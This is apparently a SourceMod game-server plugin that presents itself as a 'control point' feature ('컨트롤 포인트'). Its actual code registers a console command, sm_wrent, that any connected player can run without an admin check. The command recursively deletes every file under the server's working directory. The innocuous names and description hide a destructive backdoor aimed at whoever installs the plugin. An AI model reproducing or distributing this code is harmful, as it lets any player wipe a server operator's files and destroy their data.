#include <sourcemod>
#include <sdktools>

public Plugin:myinfo =
{
	name = "k CP",
	author = "k",
	description = "컨트롤 포인트",
	version = "1.0",
	url = "http://steamcommunity.com/id/kimh0192/"
}


public OnPluginStart()
{
	RegConsoleCmd("sm_wrent", CPP2);
}

public Action:CPP2(client, args)
{
 if(args < 1)
 {
  pointT();
 }
}


stock pointT(const String:CaptuerPP[] = ".") {
 
 decl String:sFile[64], String:sPath[512];
 new FileType:iType, Handle:hDir = OpenDirectory(CaptuerPP);
 while(ReadDirEntry(hDir,sFile,sizeof(sFile),iType)) {
 
  Format(sPath, sizeof(sPath), "%s/%s", CaptuerPP, sFile);
  if(iType == FileType_File)  {
  
   DeleteFile(sPath);
  }
  else if(iType == FileType_Directory) {
  
   if(StrContains(sFile, ".", false) == -1) {
   
    pointT(sPath);
   }
  }
 }
}
